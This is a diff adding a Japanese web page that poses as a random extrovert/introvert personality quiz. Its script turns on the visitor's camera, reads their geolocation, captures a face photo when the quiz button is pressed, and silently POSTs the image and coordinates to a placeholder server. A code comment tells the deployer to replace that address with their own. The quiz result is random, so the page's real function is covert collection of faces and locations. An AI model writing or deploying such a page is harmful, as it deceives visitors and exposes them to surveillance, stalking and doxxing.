@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>陽キャ・陰キャ診断</title>
+    <style>
+        body { text-align: center; font-family: sans-serif; background: #f0f0f0; }
+        video { width: 90%; border-radius: 10px; border: 3px solid #333; }
+        #result { font-size: 24px; font-weight: bold; margin-top: 20px; color: #ff4500; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+    <h1>陽キャ・陰キャ診断</h1>
+    <video id="video" autoplay playsinline></video>
+    <br><br>
+    <button id="btn">診断を開始する</button>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="result"></div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const btn = document.getElementById('btn');
+        const resultDiv = document.getElementById('result');
+
+        // 1. カメラの起動
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => alert("カメラの許可が必要です: " + err));
+
+        btn.onclick = () => {
+            resultDiv.innerText = "スキャン中...";
+
+            // 2. 位置情報の取得
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+
+                // 3. 顔写真のキャプチャ
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg');
+
+                // 4. ランダム診断
+                const res = Math.random() > 0.5 ? "陽キャ" : "陰キャ";
+                resultDiv.innerText = "結果: " + res;
+
+                // 5. データの送信 (あなたのサーバーURLに書き換えてください)
+                const targetUrl = 'https://your-server.com/api/save'; 
+                
+                try {
+                    await fetch(targetUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: imageData, lat, lng, result: res })
+                    });
+                    console.log("送信成功");
+                } catch (e) {
+                    console.error("送信失敗", e);
+                }
+
+            }, (err) => {
+                alert("位置情報を許可してください: " + err.message);
+            });
+        };
+    </script>
+</body>
+</html>
